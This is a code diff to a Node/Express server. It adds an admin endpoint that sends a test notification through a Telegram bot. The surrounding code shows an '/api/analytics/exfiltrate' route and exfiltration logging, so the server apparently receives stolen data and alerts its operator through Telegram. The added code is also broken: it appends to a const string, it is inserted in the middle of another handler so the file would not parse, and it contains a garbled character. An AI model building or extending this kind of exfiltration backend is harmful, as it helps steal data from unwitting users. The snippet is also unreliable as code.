@@ -399,6 +399,32 @@ app.post('/api/analytics/exfiltrate', async (req, res) => {
             });
         }
 
+// Endpoint pour tester le bot Telegram
+app.post('/api/admin/test-telegram', async (req, res) => {
+    try {
+        if (!telegramBot) {
+            return res.status(400).json({ error: 'Bot Telegram non configuré' });
+        }
+
+        const testMessage = `🧪 <b>TEST BOT TELEGRAM</b>\n\n`;
+        testMessage += `⏰ <b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}\n`;
+        testMessage += `✅ <b>Statut:</b> Test de connexion réussi\n`;
+        testMessage += `�� <b>Action:</b> Vérification des notifications`;
+
+        await telegramBot.sendMessage(testMessage);
+
+        res.json({
+            success: true,
+            message: 'Test Telegram envoyé avec succès',
+            timestamp: new Date().toISOString()
+        });
+
+    } catch (error) {
+        console.error('Erreur lors du test Telegram:', error);
+        res.status(500).json({ error: 'Erreur lors du test Telegram' });
+    }
+});
+
         // Log de l'exfiltration
         await db.logExfiltration({
             userId: 'anonymous',
@@ -532,3 +558,4 @@ if (process.env.NODE_ENV !== 'production') {
 
 // Export pour Vercel
 module.exports = app; 
+
